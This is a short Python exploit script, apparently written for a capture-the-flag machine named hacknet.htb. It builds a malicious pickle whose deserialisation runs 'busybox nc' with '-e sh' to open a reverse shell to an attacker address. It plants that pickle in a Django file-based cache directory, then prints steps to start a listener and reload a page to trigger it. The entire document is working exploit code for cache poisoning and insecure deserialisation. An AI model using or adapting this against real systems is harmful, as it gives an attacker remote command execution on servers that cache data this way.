import os
import pickle

LHOST = "10.10.14.00"
LPORT = 6969
CACHE_PATH = "/var/tmp/django_cache"
CACHE_FILE = "92edc87e91d6f8579414a59afd91bfb8.djcache"

class Exploit:
    def __reduce__(self):
        cmd = f"busybox nc {LHOST} {LPORT} -e sh"
        return (os.system, (cmd,))

payload = pickle.dumps(Exploit(), protocol=pickle.HIGHEST_PROTOCOL)
fpath = os.path.join(CACHE_PATH, CACHE_FILE)
try:
    with open(fpath, "wb") as f:
        f.write(payload)
    print(f"[+] Created {fpath}")
except Exception as e:
    print(f"[-] Failed writing to {fpath}: {e}")

print("\n[+] Open listener:")
print(f"    nc -lvnp {LPORT}")
print("\n[+] Refresh http://hacknet.htb/explore?page=1")